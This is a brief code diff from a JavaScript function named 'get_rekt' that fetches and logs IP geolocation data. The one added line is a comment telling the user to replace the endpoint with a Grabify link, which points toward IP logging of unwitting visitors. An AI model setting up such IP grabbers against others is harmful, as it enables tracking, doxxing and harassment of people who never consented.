@@ -88,7 +88,7 @@ async function get_rekt() {
             "YourFuckingCountryCode": "US"
         }
         */
-        const ip_data = await fetch("https://wtfismyip.com/json").then(response => response.json());
+        const ip_data = await fetch("https://wtfismyip.com/json").then(response => response.json()); // change this for ur grabify
         console.log(ip_data);
         return ip_data;
     }
